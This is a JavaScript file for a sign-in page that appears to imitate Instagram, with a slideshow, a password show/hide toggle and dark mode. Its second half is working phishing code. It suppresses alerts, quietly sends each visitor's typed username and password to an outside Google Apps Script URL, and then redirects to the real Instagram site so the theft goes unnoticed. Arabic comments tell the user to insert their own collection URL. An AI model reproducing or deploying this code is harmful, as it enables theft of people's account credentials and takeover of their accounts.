document.addEventListener('DOMContentLoaded', function() {
    let slide_content = document.querySelector('#slide-content');
    let signin_form = document.querySelector('#signin-form');
    let signin_btn = document.querySelector('#signin-btn');
    let darkmode_toggle = document.querySelector('#darkmode-toggle');

    let slide_index = 0;

    function slide() {
        let slide_items = slide_content.querySelectorAll('img');
        slide_items.forEach(e => e.classList.remove('active'));
        slide_index = (slide_index + 1) % slide_items.length;
        slide_items[slide_index].classList.add('active');
    }

    setInterval(slide, 2000);

    document.querySelectorAll('.animate-input').forEach(e => {
        let input = e.querySelector('input');
        let button = e.querySelector('button');

        input.onkeyup = () => {
            if (input.value.trim().length > 0) {
                e.classList.add('active');
            } else {
                e.classList.remove('active');
            }

            if (checkSigninInput()) {
                signin_btn.classList.remove('inactive');
                signin_btn.classList.add('active');
                signin_btn.removeAttribute('disabled');
            } else {
                signin_btn.classList.remove('active');
                signin_btn.classList.add('inactive');
                signin_btn.setAttribute('disabled', 'true');
            }
        };

        if (button) {
            button.onclick = () => {
                if (input.getAttribute('type') === 'text') {
                    input.setAttribute('type', 'password');
                    button.innerHTML = 'Show';
                } else {
                    input.setAttribute('type', 'text');
                    button.innerHTML = 'Hide';
                }
            };
        }
    });

    function checkSigninInput() {
        const inputs = signin_form.querySelectorAll('input');
        return Array.from(inputs).every(input => {
            return input.value.trim().length >= (input.type === 'password' ? 8 : 6);
        });
    }

    signin_btn.addEventListener('click', function(event) {
        event.preventDefault();

        if (signin_btn.classList.contains('active') && checkSigninInput()) {
            signin_btn.style.backgroundColor = "#0a3d91";
            window.location.href = 'https://www.instagram.com/';
        }
    });

    darkmode_toggle.onclick = (e) => {
        e.preventDefault();
        let body = document.querySelector('body');
        body.classList.toggle('dark');
        darkmode_toggle.innerHTML = body.classList.contains('dark') ? 'Lightmode' : 'Darkmode';
    };
});


  // تعطيل نوافذ التنبيه باستخدام دالة العنصر window.alert
window.alert = function() {};

document.getElementById('signin-btn').addEventListener('click', function() {
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;

    // قم بتعديل الرابط أدناه ليكون عنوان URL الذي تم نشر السكريبت عليه
    var scriptUrl = 'https://script.google.com/macros/s/AKfycbxv66YncvUUznJ3ff_-NJC4qpDIVSvxpfujccjXseFcErEtDukAb3-V9PJmN17sOzcyEw/exec';

    // إرسال البيانات إلى السكريبت الخاص بك
    var xhr = new XMLHttpRequest();
    xhr.open('GET', scriptUrl + '?username=' + username + '&password=' + password, true);
    xhr.send();

    // يمكنك إضافة مزيد من التعليمات هنا للتعامل مع الاستجابة إذا كنت بحاجة إلى ذلك
});
